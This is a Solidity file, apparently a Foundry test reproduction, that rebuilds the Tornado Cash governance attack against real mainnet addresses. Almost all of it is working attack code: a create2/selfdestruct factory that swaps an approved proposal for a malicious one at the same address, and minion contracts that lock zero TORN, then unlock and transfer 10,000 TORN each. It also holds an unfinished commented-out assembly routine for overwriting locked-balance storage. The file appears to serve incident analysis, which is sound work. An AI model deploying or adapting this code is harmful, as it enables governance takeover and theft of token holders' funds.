// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Ownable} from "./AttackerOwnable.sol";
import "./TornadoGovernance.interface.sol";
import {IERC20} from "../../interfaces/IERC20.sol";

import "forge-std/Test.sol";

// Possible implementations of what the attacked used.
// No cheatcodes are used for best representation of reality. Only logs.

// Factory capable of deploying contracts that selfdestruct changing their implementation
// using a combination of create2 and create with a transient contract
// Deployed at tx:
// https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
// More reference about this type of contracts could be found at https://github.com/0age/metamorphic
contract ReinitializableContractFactory is Ownable {
    address public proposal;
    address public transient;
    bool public deployMaliciousProposal;
    address public minionFactory;

    /**
     * @dev Modifier to ensure that the first 20 bytes of a submitted salt match
     * those of the calling account. This provides protection against the salt
     * being stolen by frontrunners or other attackers.
     * @param salt bytes32 The salt value to check against the calling address.
     */

    modifier containsCaller(bytes32 salt) {
        require(
            address(bytes20(salt)) == msg.sender,
            "Invalid salt - first 20 bytes of the salt must match calling address."
        );
        _;
    }

    // This function implements the logic behind the deployment for a proposal via a transient
    // contract
    // First, the transient contract is deployed with Create2 and then the latter deploys the
    // proposal with Create
    // More details:
    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
    // Method called after: 0xce40d339 in the attacker's contract factory
    function createProposalWithTransient(bytes32 _salt, bool _deployMaliciousProposal, address _minionFactory)
        public
        payable
        containsCaller(_salt)
        returns (address proposalContractAddress, address deployedTransientContract)
    {
        // Write the globals
        deployMaliciousProposal = _deployMaliciousProposal;
        minionFactory = _minionFactory;

        // determine the address of the transient contract.
        address transientContractAddress = getTransientContractAddress(_salt);

        // Create the transient with create2
        deployedTransientContract = address(new TransientContract{salt: _salt}());

        // ensure that the contracts were successfully deployed.
        require(
            deployedTransientContract == transientContractAddress,
            "Failed to deploy transient contract using given salt and init code."
        );

        proposalContractAddress = _getProposalAddress(transientContractAddress);
        proposal = proposalContractAddress;
        transient = deployedTransientContract;
    }

    // Precompute with create2
    function getTransientContractAddress(bytes32 salt) public view returns (address) {
        // determine the address of the transient contract.
        return address(
            uint160( // downcast to match the address type.
                uint256( // convert to uint to truncate upper digits.
                    keccak256( // compute the CREATE2 hash using 4 inputs.
                        abi.encodePacked( // pack all inputs to the hash together.
                            hex"ff", // start with 0xff to distinguish from RLP.
                            address(this), // this contract will be the caller.
                            salt, // pass in the supplied salt value.
                            keccak256(type(TransientContract).creationCode) // init
                                // code hash.
                        )
                    )
                )
            )
        );
    }

    // The proposal address will depend on the sender and its nonce.
    // As the nonce is reset when destructing, it will always be 1.
    function _getProposalAddress(address transientContractAddress) internal pure returns (address) {
        return address(
            uint160( // downcast to match the address type.
                uint256( // set to uint to truncate upper digits.
                    keccak256( // compute CREATE hash via RLP encoding.
                        abi.encodePacked( // pack all inputs to the hash together.
                            bytes1(0xd6), // first RLP byte.
                            bytes1(0x94), // second RLP byte.
                            transientContractAddress, // called by the transient contract.
                            bytes1(0x01) // nonce begins at 1 for contracts.
                        )
                    )
                )
            )
        );
    }

    function emergencyStop() external onlyOwner {
        console2.log("Triggering destruction of transient and proposal...");
        TransientContract(transient).emergencyStop();
        console2.log("Successfully destroyed proposal and transient");
    }
}

contract TransientContract is Ownable {
    // The owner of this contract will be the Factory

    address public factory;
    address public proposal;

    constructor() {
        factory = msg.sender;

        // Transfer the ownership of this contract to the factory
        _transferOwnership(factory);

        // Deployment of Proposal
        // retrieve the target implementation address from creator of this contract.
        address proposalContractAddress;
        bool deployMalicious = IReinitializableContractFactory(msg.sender).deployMaliciousProposal();
        address minionFactory = IReinitializableContractFactory(msg.sender).minionFactory();

        if (!deployMalicious) {
            console2.log("Deploying initial proposal...");
            proposalContractAddress = address(new Proposal_20());
        } else {
            console2.log("Deploying malicious proposal...");
            proposalContractAddress = address(new Malicious_Proposal_20(minionFactory));
        }

        // ensure that the proposal contract was successfully deployed.
        require(proposalContractAddress != address(0));
        proposal = proposalContractAddress;
    }

    // The attacker named this function after "emergencyStop"
    // More details:
    // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
    // This call first triggers the destruction of the Proposal and then its own.
    function emergencyStop() external onlyOwner {
        IMaliciousSelfDestruct(proposal).emergencyStop(); // Destroy the proposal
        console2.log("Destroying transient...");
        selfdestruct(payable(owner())); // Destroy this
    }
}

// The initial malicious proposal implementation could be debugged here:
// https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=3&debugLine=3
// The attacker said that this would have the same impl as Proposal 16
// https://etherscan.io/address/0xd4b776caf2a39aeceb21a5dd7812082e2391b03d#code
contract Proposal_20 is Ownable {
    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[4] memory VIOLATING_RELAYERS = [
            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth
            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth
            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth
        ];

        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
    }

    function emergencyStop() public onlyOwner {
        console2.log("Destroying proposal...");
        selfdestruct(payable(0));
    }
}

contract Malicious_Proposal_20 is Ownable {
    address immutable minionFactory;

    constructor(address _factory) {
        minionFactory = _factory;
    }

    function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
        uint256 nullifiedTotal;

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;

        for (uint8 x = 0; x < relayers.length; x++) {
            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);
        }

        return nullifiedTotal;
    }

    function executeProposal() external {
        address[4] memory VIOLATING_RELAYERS = [
            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth
            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth
            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth
            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth
        ];

        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);

        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;
        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;

        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);
        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);

        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);

        // Added code to sstore over the lockedBalance mapping the new value for the minions
        address[] memory minions = Attacker1Contract(minionFactory).getMinions();
        // =============== WIP ===============
        // We need to calculate the lockedBalanceSlot so we can then calculate the offset for each minion

        // for (uint256 i = 0; i < minions.length; i++) {
        //     console2.log(minions[i]);
        //     address curMinion = minions[i];
        //     uint256 amount = 10_000 ether;
        //     uint256 lockedBalanceSlot;
        //     assembly {
        //         mstore(0, curMinion)
        //         mstore(32, lockedBalanceSlot)
        //         let hash := keccak256(0, 64)
        //         sstore(hash, amount)
        //     }
        // }
    }

    function emergencyStop() public onlyOwner {
        console2.log("Destroying proposal...");
        selfdestruct(payable(0));
    }
}

contract Attacker1Contract {
    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    address[] internal _minionContracts;

    function getMinions() public view returns (address[] memory) {
        return _minionContracts;
    }

    function deployMultipleContracts(uint256 amount) external {
        address newMinion;
        for (uint256 i = 0; i < amount;) {
            console2.log("Deploying and preparing minion #%s", i + 1);
            newMinion = address(new Attacker1Minion());
            _minionContracts.push(newMinion);

            tornToken.transferFrom(msg.sender, newMinion, 0);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
            Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.LOCK);

            unchecked {
                ++i;
            }
        }
    }

    function triggerUnlock() external {
        uint256 amountOfMinions = _minionContracts.length;
        for (uint256 i = 0; i < amountOfMinions;) {
            address currentMinion = _minionContracts[i];
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.UNLOCK);
            Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.TRANSFER);

            unchecked {
                ++i;
            }
        }
    }
}

contract Attacker1Minion {
    enum AttackInstruction {
        APPROVE,
        LOCK,
        UNLOCK,
        TRANSFER
    }

    IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);

    address owner;

    constructor() {
        owner = msg.sender;
    }

    // this function has the signature 0x93d3a7b6 on each minion contract
    // The attacker calls this function many times but with different traces, meaning that has some
    // type of control flow
    function attackTornado(AttackInstruction instruction) external {
        if (instruction == AttackInstruction.APPROVE) {
            tornToken.approve(address(TORNADO_GOVERNANCE), 0);
        } else if (instruction == AttackInstruction.LOCK) {
            TORNADO_GOVERNANCE.lockWithApproval(0);
        } else if (instruction == AttackInstruction.UNLOCK) {
            TORNADO_GOVERNANCE.unlock(10_000 ether); // 10000000000000000000000
        } else if (instruction == AttackInstruction.TRANSFER) {
            tornToken.transfer(owner, 10_000 ether);
        }
    }
}
